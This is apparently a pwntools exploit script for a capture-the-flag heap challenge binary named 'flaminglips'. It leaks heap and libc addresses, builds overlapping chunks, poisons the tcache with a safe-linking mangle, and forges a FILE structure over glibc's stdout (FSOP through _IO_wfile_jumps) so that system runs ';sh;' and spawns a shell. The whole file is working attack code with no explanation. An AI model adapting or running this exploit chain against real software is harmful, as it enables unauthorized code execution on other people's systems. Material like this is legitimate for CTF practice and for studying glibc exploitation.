#!/usr/bin/env python3

from pwn import *
from subprocess import check_output

exe = ELF('flaminglips_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda p, data: p.send(data)
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
mangle = lambda val, adrs: 	(adrs >> 12) ^ val

cmd = f'''
b* menu_malloc+166
b* menu_free+160
'''

def get_pid(name):
    return int(check_output(["pgrep", "-f", "-n", name]))


def GDB():
    if args.DOCKER:
        gdb.attach(pid, exe=exe.path, 
            gdbscript=f"set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe\n" + cmd)
        pause()
    else:
        gdb.attach(p, gdbscript = cmd)
        input()

def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP




if args.REMOTE:
    p = remote('')
elif args.DOCKER:
    p = remote('')
    sleep(2)
    # pid = 
else:
    p = process([exe.path])

def add(idx, size, payload):
    sla(p, b'> ', b'1')
    sla(p, b'> ', b'%d' % idx)
    sla(p, b'> ', b'%d' % size)
    sla(p, b'> ', payload)
def delete(idx):
    sla(p, b'> ', b'2')
    sla(p, b'> ', b'%d' % idx)
def edit(idx, payload):
    sla(p, b'> ', b'3')
    sla(p, b'> ', b'%d' % idx)
    sla(p, b'> ', payload)
def view(idx):
    sla(p, b'> ', b'4')
    sla(p, b'> ', b'%d' % idx)

p.recvuntil(b'leak: ')
heap = int(p.recvline()[:-1], 16) - 0x2a0
info('Heap base: ' + hex(heap))
add(1, 0xd20, b'A')
add(2, 0x20, b'A')
delete(1)
add(3, 0, b'')
view(3)
libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x204120
info('Libc base: ' + hex(libc.address))
add(4, 0xff1 - 0x200, b'A')
edit(4, b'A'*(0xe00-0x10) + p64(0) + p64(0x1f1))
add(5, 0xd00, b'A')
add(6, 0x1f0, b'A')
add(7, 0xc00, b'A')
edit(7, b'A'*0xc00 + p64(0) + p64(0x1f1))
FSOP = FSOP_struct(flags = u64(b"\x01\x01;sh;\x00\x00"), \
        lock            = libc.symbols['_IO_2_1_stdout_'] + 0x10, \
        _IO_read_ptr    = 0x0, \
        _IO_write_base  = 0x0, \
        _wide_data      = libc.symbols['_IO_2_1_stdout_'] - 0x10, \
        _unused2        = p64(libc.symbols['system'])+ b"\x00"*4 + p64(libc.symbols['_IO_2_1_stdout_'] + 196 - 104), \
        vtable          = libc.symbols['_IO_wfile_jumps'] - 0x20, \
        )
print(len(FSOP))
add(8, 0x1f0, b'A')
edit(7, b'A'*0xc00 + p64(0) + p64(0x1d1) + p64(mangle(libc.sym._IO_2_1_stdout_, heap+0x21e20)))
add(9, 0x1d0-0x8, b'A')
add(10, 0x1d0-0x8, FSOP)
p.interactive()
